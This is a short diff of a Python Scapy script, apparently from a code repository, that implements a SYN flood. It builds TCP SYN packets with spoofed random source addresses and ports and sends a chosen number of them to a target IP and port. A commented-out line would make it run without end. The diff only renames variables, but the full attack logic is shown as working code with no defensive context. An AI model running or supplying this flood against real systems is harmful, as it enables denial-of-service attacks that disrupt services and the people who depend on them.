@@ -8,19 +8,19 @@ def randomInt():
     return randint(8000, 9000)
 
 
-def SynFlood(destination_ip, destination_port, packetNum):
+def SynFlood(destination_ip, destination_port, packet_num):
     sent_count = 0
 
     # while True: # Uncomment if you want to call infinitive
-    for x in range(0, packetNum):
+    for x in range(0, packet_num):
         random_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
         random_port = randomInt()
 
-        ipLayer = IP(
+        ip_layer = IP(
             dst=destination_ip,
             src=random_ip
         )
-        tcpLayer = TCP(
+        tcp_layer = TCP(
             sport=random_port,
             dport=destination_port,
             flags="S",
@@ -28,7 +28,7 @@ def SynFlood(destination_ip, destination_port, packetNum):
             window=randomInt(),
         )
         # Combine
-        packets = ipLayer / tcpLayer
+        packets = ip_layer / tcp_layer
 
         send(packets, verbose=0)
         sent_count += 1
